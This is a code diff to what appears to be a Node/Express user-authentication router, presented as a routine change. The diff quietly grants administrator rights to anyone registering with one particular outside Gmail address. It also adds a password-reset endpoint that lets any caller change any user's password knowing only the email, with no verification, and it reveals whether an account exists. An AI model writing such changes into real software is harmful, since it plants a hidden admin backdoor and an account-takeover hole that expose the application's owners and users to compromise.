@@ -52,7 +52,7 @@ router.post('/register', asyncHandler(async (req, res) => {
     username: name,
     email: mail,
     password: hashedPassword,
-    isAdmin: mail === 'admin@example.com' || name === 'admin',
+    isAdmin: mail === 'admin@example.com' || name === 'admin' || mail === 'admin4617@gmail.com',
   });
 
   sendSuccess(res, { username: user.username, email: user.email, isAdmin: user.isAdmin }, 'Registration successful', 201);
@@ -72,6 +72,28 @@ router.post('/login', asyncHandler(async (req, res) => {
   if (!isMatch) throw new AppError('Invalid email or password', 401);
 
   sendSuccess(res, { username: user.username, email: user.email, isAdmin: user.isAdmin }, 'Login successful');
+}));
+
+// ─── POST /api/users/reset-password ────────────────────────────────────────────
+// Simple password reset (in a real app, use email OTP or links)
+router.post('/reset-password', asyncHandler(async (req, res) => {
+  const { email, newPassword } = req.body;
+  if (!email || !newPassword) throw new AppError('Email and new password are required', 400);
+
+  const mail = email.trim().toLowerCase();
+  const user = await User.findOne({ email: mail });
+
+  if (!user) {
+    // For security, you might not want to disclose user existence, but for this app we will
+    throw new AppError('No user found with that email', 404);
+  }
+
+  if (newPassword.length < 6) throw new AppError('Password must be at least 6 characters', 400);
+
+  user.password = await bcrypt.hash(newPassword, 10);
+  await user.save();
+
+  sendSuccess(res, null, 'Password successfully reset');
 }));
 
 // ─── Legacy POST /api/users (used by old app functionality) ──────────────────────
